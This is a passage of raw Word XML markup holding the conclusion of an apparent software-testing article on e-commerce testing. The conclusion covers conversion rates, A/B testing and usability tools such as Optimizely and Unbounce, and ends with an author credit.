          </w:rPr>
          <w:t xml:space="preserve"> testing is very challenging in e-commerce because of Compliance with accessibility standards to support multi-lingual markets and business regions.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="267" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1248" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1249" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Conclusion:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1250" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1251" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Now, that we have a few tests listed out, let’s move on to a couple of </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve">finishing thoughts on </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>eCommerce</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t xml:space="preserve"> Testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1252" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1253" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>A website should work – not just on computers but on mobile devices too. It needs to be responsive and secure. The Database should be optimized and the </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/etl-testing-data-warehouse-testing/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>ETL processes</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> should help maintain a Data Warehouse that aids for OLAP and BI. E-commerce testing should focus on all of that.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1254" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1255" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>However, the most important part of E-Commerce Testing is whether the visitors are converting into paying customers or not. The number of visits that are becoming the customer is called “Conversion Rate”.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1256" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1257" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>So does one feature promote better conversion as opposed to another, is important testing. That is why </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/multivariate-testing-and-ab-testing/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>A/B testing</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> and Usability Engineering for E-Commerce sites are gaining prominence.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1258" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1259" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Check out this article: </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://articles.uie.com/three_hund_million_button/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>The $300 Million Button</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1260" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1261" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>There are tools that are targeted at helping E-Commerce sites analyze their design for better conversion rates:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="177"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1262" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1263" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.optimizely.com/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="777777"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Optimizely</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>: A personal favorite. Very affordable and very insightful for E-Commerce A/B testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="177"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1264" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1265" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://unbounce.com/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="777777"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Unbounce</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>: You can build your own landing pages and do a quick split or A/B testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="177"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1266" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1267" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.conceptfeedback.com/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="777777"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Concept Feedback</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>: You can submit your website and get expert feedback on your site’s design and strategy.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="369" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1268" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1269" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>Any usability testing tool can be used here, but the above three are my favorite.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1270" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1271" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>For more tools, check out:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="178"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1272" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1273" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/best-usability-testing-tools/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="777777"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>16+ TOP Usability Testing Tools to Test Your Web Application</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="178"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1274" w:author="Unknown"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1275" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/usability-testing-guide/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="777777"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t xml:space="preserve">A Complete Guide to Usability Testing – It’s </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="777777"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Like</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="777777"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t xml:space="preserve"> Trying to Read Minds!</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="222222"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="369" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="1276" w:author="Unknown"/>
          <w:color w:val="222222"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1277" w:author="Unknown">
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>About the Author:</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t> This article is written by STH team member Swati S. If you want to write and help testing community </w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestinghelp.com/contact/" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="777777"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>let us know here</w:t>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00F97FFE">
          <w:rPr>
            <w:color w:val="222222"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00F97FFE" w:rsidRPr="00F97FFE" w:rsidRDefault="00F97FFE" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
